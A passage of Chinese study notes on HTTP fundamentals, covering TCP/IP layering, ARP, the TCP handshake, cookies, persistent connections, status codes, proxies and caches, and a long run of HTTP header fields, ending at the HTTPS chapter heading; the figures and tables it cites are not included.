Protocol，文件传输协议）和 DNS（Domain Name System，域名系统）服务就是其中两类。\nHTTP 协议也处于该层。\n传输层\n传输层对上层应用层，提供处于网络连接中的两台计算机之间的数据传输。\n在传输层有两个性质不同的协议：TCP（Transmission Control Protocol，传输控制协议）和 UDP（User Data Protocol，用户数据报协议）。\n网络层（又名网络互连层）\n网络层用来处理在网络上流动的数据包。数据包是网络传输的最小数据单位。该层规定了通过怎样的路径（所谓的传输路线）到达对方计算机，并把数据包传送给对方。\n与对方计算机之间通过多台计算机或网络设备进行传输时，网络层所起的作用就是在众多的选项内选择一条传输路线。\n链路层（又名数据链路层，网络接口层）\n用来处理连接网络的硬件部分。包括控制操作系统、硬件的设备驱动、NIC（Network Interface Card，网络适配器，即网卡），及光纤等物理可见部分（还包括连接器等一切传输媒介）。硬件上的范畴均在链路层的作用范围之内。\nIP、TCP 和 DNS 负责传输的 IP 协议\n按层次分，IP（Internet Protocol）网际协议位于网络层。\nIP 协议的作用是把各种数据包传送给对方。而要保证确实传送到对方那里，则需要满足各类条件。其中两个重要的条件是 ==IP 地址==和==MAC地址==（Media Access Control Address）。 IP 地址指明了节点被分配到的地址，MAC 地址是指网卡所属的固定地址。IP 地址可以和 MAC 地址进行配对。IP 地址可变换，但 MAC 地址基本上不会更改。\n==使用 ARP 协议凭借 MAC 地址进行通信==\nIP 间的通信依赖 MAC 地址。在网络上，通信的双方在同一局域网（LAN）内的情况是很少的，通常是经过多台计算机和网络设备中转才能连接到对方。而在进行中转时，会利用下一站中转设备的 MAC地址来搜索下一个中转目标。这时，会采用==ARP 协议（Address Resolution Protocol）。ARP 是一种用以解析地址的协议，根据通信方的 IP 地址就可以反查出对应的 MAC==。\n确保可靠性的 TCP 协议\n按层次分，TCP 位于传输层，提供可靠的字节流服务。\n为了准确无误地将数据送达目标处，TCP 协议采用了==三次握手（three-way handshaking）==策略。用 TCP 协议把数据包送出去后，TCP不会对传送后的情况置之不理，它一定会向对方确认是否成功送达。 握手过程中使用了 TCP 的标志（flag） —— ==SYN（synchronize）==和 ==ACK（acknowledgement）==。\n==发送端首先发送一个带 SYN 标志的数据包给对方。接收端收到后，回传一个带有 SYN/ACK 标志的数据包以示传达确认信息。最后，发送端再回传一个带 ACK 标志的数据包，代表“握手”结束。==\n若在握手过程中某个阶段莫名中断，TCP 协议会再次以相同的顺序发送相同的数据包。\n负责域名解析的 DNS 服务\nDNS（Domain Name System）服务是和 HTTP 协议一样位于应用层的协议。它提供域名到 IP 地址之间的解析服务。\n各种协议与 HTTP 协议的关系 URI 和 URL URI（统一资源标识符）\nURL（Uniform Resource Locator，统一资源定位符），URL正是使用 Web 浏览器等访问 Web 页面时需要输入的网页地址。\nURI 用字符串标识某一互联网资源，而 URL表示资源的地点（互联网上所处的位置）。可见==URL是 URI 的子集==。\n第 2 章 简单的 HTTP 协议 HTTP 是不保存状态的协议 HTTP 是一种不保存状态，即==无状态（stateless）协议==。HTTP 协议自身不对请求和响应之间的通信状态进行保存。也就是说在 HTTP 这个级别，协议对于发送过的请求或响应都不做持久化处理。\n使用 HTTP 协议，每当有新的请求发送时，就会有对应的新响应产生。协议本身并不保留之前一切的请求或响应报文的信息。这是为了更快地处理大量事务，确保协议的可伸缩性，而特意把 HTTP 协议设计成如此简单的。\nHTTP/1.1 虽然是无状态协议，但为了实现期望的保持状态功能，于是引入了 Cookie 技术。有了 Cookie 再用 HTTP 协议通信，就可以管理状态了。\n持久连接节省通信量 HTTP 协议的初始版本中，每进行一次 HTTP 通信就要断开一次 TCP 连接。\n**持久连接 **\n为解决上述 TCP 连接的问题，HTTP/1.1 和一部分的 HTTP/1.0 想出了持久连接（HTTP Persistent Connections，也称为 HTTP keep-alive 或 HTTP connection reuse）的方法。持久连接的特点是，==只要任意一端没有明确提出断开连接，则保持 TCP 连接状态==。\n持久连接的好处在于减少了 TCP 连接的重复建立和断开所造成的额外开销，减轻了服务器端的负载。另外，减少开销的那部分时间，使HTTP 请求和响应能够更早地结束，这样 Web 页面的显示速度也就相应提高了。\n管线化\n持久连接使得多数请求以==管线化（pipelining）==方式发送成为可能。从前发送请求后需等待并收到响应，才能发送下一个请求。管线化技术出现后，不用等待响应亦可直接发送下一个请求。\n这样就能够做到同时并行发送多个请求，而不需要一个接一个地等待响应了。\n比如，当请求一个包含 10 张图片的 HTMLWeb 页面，与挨个连接相比，用持久连接可以让请求更快结束。而管线化技术则比持久连接还要快。请求数越多，时间差就越明显。\n使用 Cookie 的状态管理 HTTP 是无状态协议，它不对之前发生过的请求和响应的状态进行管理。也就是说，无法根据之前的状态进行本次的请求处理。\n假设要求登录认证的 Web 页面本身无法进行状态的管理（不记录已登录的状态），那么每次跳转新页面不是要再次登录，就是要在每次请求报文中附加参数来管理登录状态。\n保留无状态协议这个特征的同时又要解决类似的矛盾问题，于是引入了 Cookie 技术。==Cookie 技术通过在请求和响应报文中写入 Cookie 信息来控制客户端的状态==。\nCookie 会根据从服务器端发送的响应报文内的一个叫做 Set-Cookie 的首部字段信息，通知客户端保存 Cookie。当下次客户端再往该服务器发送请求时，客户端会自动在请求报文中加入 Cookie 值后发送出去。\n服务器端发现客户端发送过来的 Cookie 后，会去检查究竟是从哪一个客户端发来的连接请求，然后对比服务器上的记录，最后得到之前的状态信息。\n上图展示了发生 Cookie 交互的情景，HTTP 请求报文和响应报文的内容如下。\n第 3 章 HTTP 报文内的 HTTP 信息 ==用于 HTTP 协议交互的信息被称为 HTTP 报文。==请求端（客户端）的HTTP 报文叫做请求报文，响应端（服务器端）的叫做响应报文。 HTTP 报文本身是由多行（用 CR+LF 作换行符）数据构成的字符串文本。\nHTTP 报文大致可分为报文首部和报文主体两块。两者由最初出现的空行（CR+LF）来划分。通常，并不一定要有报文主体。\n请求报文\n响应报文\n报文主体和实体主体的差异 报文（message）\n是 HTTP 通信中的基本单位，由 8 位组字节流（octet sequence， 其中 octet 为 8 个比特）组成，通过 HTTP 通信传输。\n实体（entity）\n作为请求或响应的有效载荷数据（补充项）被传输，其内容由实体首部和实体主体组成。\nHTTP 报文的主体用于传输请求或响应的实体主体。通常，报文主体等于实体主体。只有当传输中进行编码操作时，实体主体的内容发生变化，才导致它和报文主体产生差异。\n报文和实体这两个术语在之后会经常出现，请事先理解两者的差异。\n第 4 章 返回结果的 HTTP 状态码 2XX 成功 2XX 的响应结果表明请求被正常处理了。\n200 OK\n表示从客户端发来的请求在服务器端被正常处理了。在响应报文内，随状态码一起返回的信息会因方法的不同而发生改变。比如，使用 GET 方法时，对应请求资源的实体会作为响应返回；而使用 HEAD 方法时，对应请求资源的实体首部不随报文主体作为响应返回（即在响应中只返回首部，不会返回实体的主体部分）。\n204 No Content\n该状态码代表服务器接收的请求已成功处理，但在返回的响应报文中不含实体的主体部分。另外，也不允许返回任何实体的主体。比如，当从浏览器发出请求处理后，返回 204 响应，那么浏览器显示的页面不发生更新。\n一般在只需要从客户端往服务器发送信息，而对客户端不需要发送新信息内容的情况下使用。\n206 Partial Content\n该状态码表示客户端进行了范围请求，而服务器成功执行了这部分的GET 请求。响应报文中包含由 Content-Range 指定范围的实体内容。\n3XX 重定向 3XX 响应结果表明浏览器需要执行某些特殊的处理以正确处理请求。\n301 Moved Permanently\n永久性重定向。该状态码表示请求的资源已被分配了新的 URI，以后应使用资源现在所指的 URI。也就是说，如果已经把资源对应的 URI 保存为书签了，这时应该按 Location 首部字段提示的 URI 重新保存。像下方给出的请求 URI，当指定资源路径的最后忘记添加斜杠“/”，就会产生 301 状态码。\n302 Found\n临时性重定向。该状态码表示请求的资源已被分配了新的 URI，希望用户（本次）能使用新的 URI 访问。\n和 301 Moved Permanently 状态码相似，但 302 状态码代表的资源不是被永久移动，只是临时性质的。换句话说，已移动的资源对应的URI 将来还有可能发生改变。比如，用户把 URI 保存成书签，但不会像 301 状态码出现时那样去更新书签，而是仍旧保留返回 302 状态码的页面对应的 URI。\n303 See Other\n该状态码表示由于请求对应的资源存在着另一个 URI，应使用 GET 方法定向获取请求的资源。\n303 状态码和 302 Found 状态码有着相同的功能，但 303 状态码明确表示客户端应当采用 GET 方法获取资源，这点与 302 状态码有区别。\n比如，当使用 POST 方法访问 CGI 程序，其执行后的处理结果是希望客户端能以 GET 方法重定向到另一个 URI 上去时，返回 303 状态码。虽然 302 Found 状态码也可以实现相同的功能，但这里使用 303 状态码是最理想的。\n304 Not Modified\n该状态码表示客户端发送附带条件的请求 （附带条件的请求是指采用 GET方法的请求报文中包含 If-Match，If-Modified-Since，If-None-Match，If-Range，If-Unmodified-Since 中任一首部） 时，服务器端允许请求访问资源，但未满足条件的情况。304 状态码返回时，不包含任何响应的主体部分。304 虽然被划分在 3XX 类别中，但是和重定向没有关系。\n307 Temporary Redirect\n临时重定向。该状态码与 302 Found 有着相同的含义。尽管 302 标准禁止 POST 变换成 GET，但实际使用时大家并不遵守。\n307 会遵照浏览器标准，不会从 POST 变成 GET。但是，对于处理响应时的行为，每种浏览器有可能出现不同的情况。\n4XX 客户端错误 4XX 的响应结果表明客户端是发生错误的原因所在。\n400 Bad Request\n该状态码表示请求报文中存在语法错误。当错误发生时，需修改请求的内容后再次发送请求。另外，浏览器会像 200 OK 一样对待该状态码。\n401 Unauthorized\n该状态码表示发送的请求需要有通过 HTTP 认证（BASIC 认证、 DIGEST 认证）的认证信息。另外若之前已进行过 1 次请求，则表示用户认证失败。\n返回含有 401 的响应必须包含一个适用于被请求资源的 WWW-Authenticate 首部用以质询（challenge）用户信息。当浏览器初次接收到 401 响应，会弹出认证用的对话窗口。\n403 Forbidden\n该状态码表明对请求资源的访问被服务器拒绝了。服务器端没有必要给出拒绝的详细理由，但如果想作说明的话，可以在实体的主体部分对原因进行描述，这样就能让用户看到了。\n未获得文件系统的访问授权，访问权限出现某些问题（从未授权的发送源 IP 地址试图访问）等列举的情况都可能是发生 403 的原因。\n404 Not Found\n该状态码表明服务器上无法找到请求的资源。除此之外，也可以在服务器端拒绝请求且不想说明理由时使用。\n5XX 服务器错误 5XX 的响应结果表明服务器本身发生错误。\n500 Internal Server Error\n该状态码表明服务器端在执行请求时发生了错误。也有可能是 Web 应用存在的 bug 或某些临时的故障。\n503 Service Unavailable\n该状态码表明服务器暂时处于超负载或正在进行停机维护，现在无法处理请求。如果事先得知解除以上状况需要的时间，最好写入 RetryAfter 首部字段再返回给客户端。\n第 5 章 与 HTTP 协作的 Web 服务器 用单台虚拟主机实现多个域名 HTTP/1.1 规范允许一台 HTTP 服务器搭建多个 Web 站点。比如，提供 Web 托管服务（Web Hosting Service）的供应商，可以用一台服务器为多位客户服务，也可以以每位客户持有的域名运行各自不同的网站。这是因为利用了虚拟主机（Virtual Host，又称虚拟服务器）的功能。\n即使物理层面只有一台服务器，但只要使用虚拟主机的功能，则可以假想已具有多台服务器。\n通信数据转发程序 ：代理、网关、隧道 代理\n代理有多种使用方法，按两种基准分类。一种是是否使用缓存，另一种是是否会修改报文。\n==缓存代理==\n代理转发响应时，缓存代理（Caching Proxy）会预先将资源的副本（缓存）保存在代理服务器上。\n当代理再次接收到对相同资源的请求时，就可以不从源服务器那里获取资源，而是将之前缓存的资源作为响应返回。\n==透明代理==\n转发请求或响应时，不对报文做任何加工的代理类型被称为透明代理（Transparent Proxy）。反之，对报文内容进行加工的代理被称为非透明代理。\n网关\n网关的工作机制和代理十分相似。而==网关能使通信线路上的服务器提供非 HTTP 协议服务==。\n利用网关能提高通信的安全性，因为可以在客户端与网关之间的通信线路上加密以确保连接的安全。比如，网关可以连接数据库，使用SQL语句查询数据。另外，在 Web 购物网站上进行信用卡结算时，网关可以和信用卡结算系统联动。\n隧道\n隧道可按要求建立起一条与其他服务器的通信线路，届时使用 SSL等加密手段进行通信。==隧道的目的是确保客户端能与服务器进行安全的通信。==\n隧道本身不会去解析 HTTP 请求。也就是说，请求保持原样中转给之后的服务器。隧道会在通信双方断开连接时结束。\n保存资源的缓存 缓存是指代理服务器或客户端本地磁盘内保存的资源副本。利用缓存可减少对源服务器的访问，因此也就节省了通信流量和通信时间。\n缓存服务器是代理服务器的一种，并归类在缓存代理类型中。换句话说，当代理转发从服务器返回的响应时，代理服务器将会保存一份资源的副本。\n第 6 章 HTTP 首部 HTTP 报文首部 HTTP 请求报文\nHTTP 响应报文\nHTTP 首部字段 表 6-1：通用首部字段\n表 6-2：请求首部字段\n表 6-3：响应首部字段\n表 6-4：实体首部字段\nEnd-to-end 首部和 Hop-by-hop 首部\nHTTP 首部字段将定义成缓存代理和非缓存代理的行为，分成 2 种类型。\n端到端首部（End-to-end Header）\n分在此类别中的首部会转发给请求 / 响应对应的最终接收目标，且必须保存在由缓存生成的响应中，另外规定它必须被转发。\n逐跳首部（Hop-by-hop Header）\n分在此类别中的首部只对单次转发有效，会因通过缓存或代理而不再转发。HTTP/1.1 和之后版本中，如果要使用 hop-by-hop 首部，需提供 Connection 首部字段。\n下面列举了 HTTP/1.1 中的逐跳首部字段。除这 8 个首部字段之外，其他所有字段都属于端到端首部。\nConnection Keep-Alive Proxy-Authenticate Proxy-Authorization Trailer TE Transfer-Encoding Upgrade HTTP/1.1 通用首部字段 通用首部字段是指，请求报文和响应报文双方都会使用的首部。\n==Cache-Control==\n通过指定首部字段 Cache-Control 的指令，就能操作缓存的工作机制。\n指令的参数是可选的，多个指令之间通过“,”分隔。首部字段 Cache-Control 的指令可用于请求及响应时。\nCache-Control 指令一览\n==Connection==\nConnection 首部字段具备如下两个作用。\n控制不再转发给代理的首部字段 管理持久连接 控制不再转发给代理的首部字段\n在客户端发送请求和服务器返回响应内，使用 Connection 首部字段，可控制不再转发给代理的首部字段（即 Hop-by-hop 首部）。\n管理持久连接\nHTTP/1.1 版本的默认连接都是持久连接。为此，客户端会在持久连接上连续发送请求。当服务器端想明确断开连接时，则指定Connection 首部字段的值为 Close。\n==Date==\n首部字段 Date 表明创建 HTTP 报文的日期和时间。\n==Pragma==\nPragma 是 HTTP/1.1 之前版本的历史遗留字段，仅作为与 HTTP/1.0 的向后兼容而定义。\n该首部字段属于通用首部字段，但只用在客户端发送的请求中。客户端会要求所有的中间服务器不返回缓存的资源。\n所有的中间服务器如果都能以 HTTP/1.1 为基准，那直接采用 Cache-Control: no-cache 指定缓存的处理方式是最为理想的。但要整体掌握全部中间服务器使用的 HTTP 协议版本却是不现实的。因此，发送的请求会同时含有下面两个首部字段。\n==Trailer==\n首部字段 Trailer 会事先说明在报文主体后记录了哪些首部字段。该首部字段可应用在 HTTP/1.1 版本分块传输编码时。\n以上用例中，指定首部字段 Trailer 的值为 Expires，在报文主体之后（分块长度 0 之后）出现了首部字段 Expires。\n==Transfer-Encoding==\n首部字段 Transfer-Encoding 规定了传输报文主体时采用的编码方式。\nHTTP/1.1 的传输编码方式仅对分块传输编码有效。\n以上用例中，正如在首部字段 Transfer-Encoding 中指定的那样，有效使用分块传输编码，且分别被分成 3312 字节和 914 字节大小的分块数据。\n==Upgrade==\n首部字段 Upgrade 用于检测 HTTP 协议及其他协议是否可使用更高的版本进行通信，其参数值可以用来指定一个完全不同的通信协议。\n上图用例中，首部字段 Upgrade 指定的值为 TLS/1.0。请注意此处两个字段首部字段的对应关系，Connection 的值被指定为 Upgrade。Upgrade 首部字段产生作用的 Upgrade 对象仅限于客户端和邻接服务器之间。因此，使用首部字段 Upgrade 时，还需要额外指定Connection:Upgrade。\n==Via==\n使用首部字段 Via 是为了追踪客户端与服务器之间的请求和响应报文的传输路径。\n报文经过代理或网关时，会先在首部字段 Via 中附加该服务器的信息，然后再进行转发。这个做法和 traceroute 及电子邮件的 Received 首部的工作机制很类似。首部字段 Via 不仅用于追踪报文的转发，还可避免请求回环的发生。所以必须在经过代理时附加该首部字段内容。\n上图用例中，在经过代理服务器 A 时，Via 首部附加了“1.0 gw.hackr.jp (Squid/3.1)”这样的字符串值。行头的 1.0 是指接收请求的服务器上应用的 HTTP 协议版本。接下来经过代理服务器 B 时亦是如此，在 Via 首部附加服务器信息，也可增加 1 个新的 Via 首部写入服务器信息。\nVia 首部是为了追踪传输路径，所以经常会和 TRACE 方法一起使用。比如，代理服务器接收到由 TRACE 方法发送过来的请求（其中Max-Forwards: 0）时，代理服务器就不能再转发该请求了。这种情况下，代理服务器会将自身的信息附加到 Via 首部后，返回该请求的响应。\n==Warning==\nHTTP/1.1 的 Warning 首部是从 HTTP/1.0 的响应首部（Retry-After）演变过来的。该首部通常会告知用户一些与缓存相关的问题的警告。\nWarning 首部的格式如下。最后的日期时间部分可省略。\n请求首部字段 请求首部字段是从客户端往服务器端发送请求报文中所使用的字段，用于补充请求的附加信息、客户端信息、对响应内容相关的优先级等内容。\n==Accept==\nAccept 首部字段可通知服务器，用户代理能够处理的媒体类型及媒体类型的相对优先级。可使用 type/subtype 这种形式，一次指定多种媒体类型。\n比如，如果浏览器不支持 PNG 图片的显示，那 Accept 就不指定 image/png，而指定可处理的 image/gif 和 image/jpeg 等图片类型。 若想要给显示的媒体类型增加优先级，则使用 q= 来额外表示权重值1，用分号（;）进行分隔。权重值 q 的范围是 0~1（可精确到小数点后 3 位），且 1 为最大值。不指定权重 q 值时，默认权重为 q=1.0。\n当服务器提供多种内容时，将会首先返回权重值最高的媒体类型。\n==Accept-Charset==\nAccept-Charset 首部字段可用来通知服务器用户代理支持的字符集及字符集的相对优先顺序。另外，可一次性指定多种字符集。与首部字段 Accept 相同的是可用权重 q 值来表示相对优先级。\n==Accept-Encoding==\nAccept-Encoding 首部字段用来告知服务器用户代理支持的内容编码及内容编码的优先级顺序。可一次性指定多种内容编码。\n下面试举出几个内容编码的例子。\ngzip\ncompress\ndeflate\nidentity\n==Accept-Language==\n首部字段 Accept-Language 用来告知服务器用户代理能够处理的自然语言集（指中文或英文等），以及自然语言集的相对优先级。可一次指定多种自然语言集。\n==Authorization==\n首部字段 Authorization 是用来告知服务器，用户代理的认证信息（证书值）。通常，想要通过服务器认证的用户代理会在接收到返回的 401 状态码响应后，把首部字段 Authorization 加入请求中。共用缓存在接收到含有 Authorization 首部字段的请求时的操作处理会略有差异。\n==Expect==\n客户端使用首部字段 Expect 来告知服务器，期望出现的某种特定行为。因服务器无法理解客户端的期望作出回应而发生错误时，会返回状态码 417 Expectation Failed。\n客户端可以利用该首部字段，写明所期望的扩展。虽然 HTTP/1.1 规范只定义了 100-continue（状态码 100 Continue 之意）。\n等待状态码 100 响应的客户端在发生请求时，需要指定 Expect:100-continue。\n==From==\n首部字段 From 用来告知服务器使用用户代理的用户的电子邮件地址。通常，其使用目的就是为了显示搜索引擎等用户代理的负责人的电子邮件联系方式。使用代理时，应尽可能包含 From 首部字段（但可能会因代理不同，将电子邮件地址记录在 User-Agent 首部字段内）。\n==Host==\n首部字段 Host 会告知服务器，请求的资源所处的互联网主机名和端口号。Host 首部字段在 HTTP/1.1 规范内是==唯一一个必须被包含在请求内的首部字段==。\n==首部字段 Host 和以单台服务器分配多个域名的虚拟主机的工作机制有很密切的关联，这是首部字段 Host 必须存在的意义==。\n请求被发送至服务器时，请求中的主机名会用 IP 地址直接替换解决。但如果这时，相同的 IP 地址下部署运行着多个域名，那么服务器就会无法理解究竟是哪个域名对应的请求。因此，就需要使用首部字段 Host 来明确指出请求的主机名。若服务器未设定主机名，那直接发送一个空值即可。\n==If-Match==\n形如 If-xxx 这种样式的请求首部字段，都可称为条件请求。服务器接收到附带条件的请求后，只有判断指定条件为真时，才会执行请求。\n首部字段 If-Match，属附带条件之一，它会告知服务器匹配资源所用的实体标记（ETag）值。这时的服务器无法使用弱 ETag 值。\n服务器会比对 If-Match 的字段值和资源的 ETag 值，仅当两者一致时，才会执行请求。反之，则返回状态码 412 Precondition Failed 的响应。\n还可以使用星号（*）指定 If-Match 的字段值。针对这种情况，服务器将会忽略 ETag 的值，只要资源存在就处理请求。\n==If-Modified-Since==\n首部字段 If-Modified-Since，属附带条件之一，它会告知服务器若 If-Modified-Since 字段值早于资源的更新时间，则希望能处理该请求。而在指定 If-Modified-Since 字段值的日期时间之后，如果请求的资源都没有过更新，则返回状态码 304 Not Modified 的响应。\nIf-Modified-Since 用于确认代理或客户端拥有的本地资源的有效性。获取资源的更新日期时间，可通过确认首部字段 Last-Modified 来确定。\n==If-None-Match==\n首部字段 If-None-Match 属于附带条件之一。==它和首部字段 If-Match 作用相反==。用于指定 If-None-Match 字段值的实体标记（ETag）值与请求资源的 ETag 不一致时，它就告知服务器处理该请求。\n在 GET 或 HEAD 方法中使用首部字段 If-None-Match 可获取最新的资源。因此，这与使用首部字段 If-Modified-Since 时有些类似。\n==If-Range==\n首部字段 If-Range 属于附带条件之一。它告知服务器若指定的 If-Range 字段值（ETag 值或者时间）和请求资源的 ETag 值或时间相一致时，则作为范围请求处理。反之，则返回全体资源。\n==If-Unmodified-Since==\n首部字段 If-Unmodified-Since 和首部字段 If-Modified-Since 的作用相反。它的作用的是告知服务器，指定的请求资源只有在字段值内指定的日期时间之后，未发生更新的情况下，才能处理请求。如果在指定日期时间后发生了更新，则以状态码 412 Precondition Failed 作为响应返回。\n==Max-Forwards==\n通过 TRACE 方法或 OPTIONS 方法，发送包含首部字段 Max-Forwards 的请求时，该字段以十进制整数形式指定可经过的服务器最大数目。服务器在往下一个服务器转发请求之前，Max-Forwards 的值减 1 后重新赋值。当服务器接收到 Max-Forwards 值为 0 的请求时，则不再进行转发，而是直接返回响应。\n使用 HTTP 协议通信时，请求可能会经过代理等多台服务器。途中，如果代理服务器由于某些原因导致请求转发失败，客户端也就等不到服务器返回的响应了。对此，我们无从可知。\n可以灵活使用首部字段 Max-Forwards，针对以上问题产生的原因展开调查。由于当 Max-Forwards 字段值为 0 时，服务器就会立即返回响应，由此我们至少可以对以那台服务器为终点的传输路径的通信状况有所把握。\n==Proxy-Authorization==\n接收到从代理服务器发来的认证质询时，客户端会发送包含首部字段Proxy-Authorization 的请求，以告知服务器认证所需要的信息。\n这个行为是与客户端和服务器之间的 HTTP 访问认证相类似的，不同之处在于，认证行为发生在客户端与代理之间。客户端与服务器之间的认证，使用首部字段 Authorization 可起到相同作用。\n==Range==\n对于只需获取部分资源的范围请求，包含首部字段 Range 即可告知服务器资源的指定范围。上面的示例表示请求获取从第 5001 字节至第10000 字节的资源。\n接收到附带 Range 首部字段请求的服务器，会在处理请求之后返回状态码为 206 Partial Content 的响应。无法处理该范围请求时，则会返回状态码 200 OK 的响应及全部资源。\n==Referer==\n首部字段 Referer 会告知服务器请求的原始资源的 URI。\n客户端一般都会发送 Referer 首部字段给服务器。但当直接在浏览器的地址栏输入 URI，或出于安全性的考虑时，也可以不发送该首部字段。\n因为原始资源的 URI 中的查询字符串可能含有 ID 和密码等保密信息，要是写进 Referer 转发给其他服务器，则有可能导致保密信息的泄露。\n==TE==\n首部字段 TE 会告知服务器客户端能够处理响应的传输编码方式及相对优先级。它和首部字段 Accept-Encoding 的功能很相像，但是用于传输编码。\n首部字段 TE 除指定传输编码之外，还可以指定伴随 trailer 字段的分块传输编码的方式。应用后者时，只需把 trailers 赋值给该字段值。\n==User-Agent==\n首部字段 User-Agent 会将创建请求的浏览器和用户代理名称等信息传达给服务器。\n由网络爬虫发起请求时，有可能会在字段内添加爬虫作者的电子邮件地址。此外，如果请求经过代理，那么中间也很可能被添加上代理服务器的名称。\n响应首部字段 响应首部字段是由服务器端向客户端返回响应报文中所使用的字段，用于补充响应的附加信息、服务器信息，以及对客户端的附加要求等信息。\n==Accept-Ranges==\n首部字段 Accept-Ranges 是用来告知客户端服务器是否能处理范围请求，以指定获取服务器端某个部分的资源。\n可指定的字段值有两种，可处理范围请求时指定其为 bytes，反之则指定其为 none。\n==Age==\n首部字段 Age 能告知客户端，源服务器在多久前创建了响应。字段值的单位为秒。\n若创建该响应的服务器是缓存服务器，Age 值是指缓存后的响应再次发起认证到认证完成的时间值。代理创建响应时必须加上首部字段Age。\n==ETag==\n首部字段 ETag 能告知客户端实体标识。它是一种可将资源以字符串形式做唯一性标识的方式。服务器会为每份资源分配对应的 ETag值。\n另外，当资源更新时，ETag 值也需要更新。生成 ETag 值时，并没有统一的算法规则，而仅仅是由服务器来分配。\n资源被缓存时，就会被分配唯一性标识。例如，当使用中文版的浏览器访问 http://www.google.com/ 时，就会返回中文版对应的资源，而使用英文版的浏览器访问时，则会返回英文版对应的资源。两者的URI 是相同的，所以仅凭 URI 指定缓存的资源是相当困难的。若在下载过程中出现连接中断、再连接的情况，都会依照 ETag 值来指定资源。\n强 ETag 值和弱 Tag 值\n强 ETag 值\n强 ETag 值，不论实体发生多么细微的变化都会改变其值。\n弱 ETag 值\n弱 ETag 值只用于提示资源是否相同。只有资源发生了根本改变，产\n生差异时才会改变 ETag 值。这时，会在字段值最开始处附加 W/。\n==Location==\n使用首部字段 Location 可以将响应接收方引导至某个与请求 URI 位置不同的资源。\n基本上，该字段会配合 3xx ：Redirection 的响应，提供重定向的URI。\n几乎所有的浏览器在接收到包含首部字段 Location 的响应后，都会强制性地尝试对已提示的重定向资源的访问。\n==Proxy-Authenticate==\n首部字段 Proxy-Authenticate 会把由代理服务器所要求的认证信息发送给客户端。\n它与客户端和服务器之间的 HTTP 访问认证的行为相似，不同之处在于其认证行为是在客户端与代理之间进行的。而客户端与服务器之间进行认证时，首部字段 WWW-Authorization 有着相同的作用。\n==Retry-After==\n首部字段 Retry-After 告知客户端应该在多久之后再次发送请求。主要配合状态码 503 Service Unavailable 响应，或 3xx Redirect 响应一起使用。\n字段值可以指定为具体的日期时间（Wed, 04 Jul 2012 06：34：24 GMT 等格式），也可以是创建响应后的秒数。\n==Server==\n首部字段 Server 告知客户端当前服务器上安装的 HTTP 服务器应用程序的信息。不单单会标出服务器上的软件应用名称，还有可能包括版本号和安装时启用的可选项。\n==Vary==\n图：当代理服务器接收到带有 Vary 首部字段指定获取资源的请求时，如果使用的 Accept-Language 字段的值相同，那么就直接从缓存返回响应。反之，则需要先从源服务器端获取资源后才能作为响应返回\n==WWW-Authenticate==\n首部字段 WWW-Authenticate 用于 HTTP 访问认证。它会告知客户端适用于访问请求 URI 所指定资源的认证方案（Basic 或是 Digest）和带参数提示的质询（challenge）。状态码 401 Unauthorized 响应中， 肯定带有首部字段 WWW-Authenticate。\n上述示例中，realm 字段的字符串是为了辨别请求 URI 指定资源所受到的保护策略。\n实体首部字段 实体首部字段是包含在请求报文和响应报文中的实体部分所使用的首部，用于补充内容的更新时间等与实体相关的信息。\n==Allow==\n首部字段 Allow 用于通知客户端能够支持 Request-URI 指定资源的所有 HTTP 方法。当服务器接收到不支持的 HTTP 方法时，会以状态码405 Method Not Allowed 作为响应返回。与此同时，还会把所有能支持的 HTTP 方法写入首部字段 Allow 后返回。\n==Content-Encoding==\n首部字段 Content-Encoding 会告知客户端服务器对实体的主体部分选用的内容编码方式。内容编码是指在不丢失实体信息的前提下所进行的压缩。\n==Content-Language==\n首部字段 Content-Language 会告知客户端，实体主体使用的自然语言（指中文或英文等语言）。\n首部字段 Content-Length 表明了实体主体部分的大小（单位是字节）。对实体主体进行内容编码传输时，不能再使用 Content-Length首部字段。\n==Content-Location==\n首部字段 Content-Location 给出与报文主体部分相对应的 URI。和首部字段 Location 不同，Content-Location 表示的是报文主体返回资源对应的 URI。\n比如，对于使用首部字段 Accept-Language 的服务器驱动型请求，当返回的页面内容与实际请求的对象不同时，首部字段 Content-Location内会写明 URI。（访问 http://www.hackr.jp/ 返回的对象却是http://www.hackr.jp/index-ja.html 等类似情况）\n==Content-MD5==\n首部字段 Content-MD5 是一串由 MD5 算法生成的值，其目的在于检查报文主体在传输过程中是否保持完整，以及确认传输到达。\n对报文主体执行 MD5 算法获得的 128 位二进制数，再通过 Base64 编码后将结果写入 Content-MD5 字段值。由于 HTTP 首部无法记录二进制值，所以要通过 Base64 编码处理。为确保报文的有效性，作为接收方的客户端会对报文主体再执行一次相同的 MD5 算法。计算出的值与字段值作比较后，即可判断出报文主体的准确性。\n采用这种方法，对内容上的偶发性改变是无从查证的，也无法检测出恶意篡改。其中一个原因在于，内容如果能够被篡改，那么同时意味着 Content-MD5 也可重新计算然后被篡改。所以处在接收阶段的客户端是无法意识到报文主体以及首部字段 Content-MD5 是已经被篡改过的。\n==Content-Range==\n针对范围请求，返回响应时使用的首部字段 Content-Range，能告知客户端作为响应返回的实体的哪个部分符合范围请求。字段值以字节为单位，表示当前发送部分及整个实体大小。\n==Content-Type==\n首部字段 Content-Type 说明了实体主体内对象的媒体类型。和首部字段 Accept 一样，字段值用 type/subtype 形式赋值。\n参数 charset 使用 iso-8859-1 或 euc-jp 等字符集进行赋值。\n==Expires==\n首部字段 Expires 会将资源失效的日期告知客户端。缓存服务器在接收到含有首部字段 Expires 的响应后，会以缓存来应答请求，在Expires 字段值指定的时间之前，响应的副本会一直被保存。当超过指定的时间后，缓存服务器在请求发送过来时，会转向源服务器请求资源。\n==Last-Modified==\n首部字段 Last-Modified 指明资源最终修改的时间。一般来说，这个值就是 Request-URI 指定资源被修改的时间。但类似使用 CGI 脚本进行动态数据处理时，该值有可能会变成数据最终修改时的时间。\n为 Cookie 服务的首部字段 Cookie 的工作机制是用户识别及状态管理。Web 网站为了管理用户的状态会通过 Web 浏览器，把一些数据临时写入用户的计算机内。接着当用户访问该Web网站时，可通过通信方式取回之前发放的Cookie。\n调用 Cookie 时，由于可校验 Cookie 的有效期，以及发送方的域、路径、协议等信息，所以正规发布的 Cookie 内的数据不会因来自其他Web 站点和攻击者的攻击而泄露。\n==Set-Cookie==\n当服务器准备开始管理客户端的状态时，会事先告知各种信息。\n下面的表格列举了 Set-Cookie 的字段值\n==Cookie==\n首部字段 Cookie 会告知服务器，当客户端想获得 HTTP 状态管理支持时，就会在请求中包含从服务器接收到的 Cookie。接收到多个Cookie 时，同样可以以多个 Cookie 形式发送。\n第 7 章 确保 Web 安全的 HTTPS HTTP 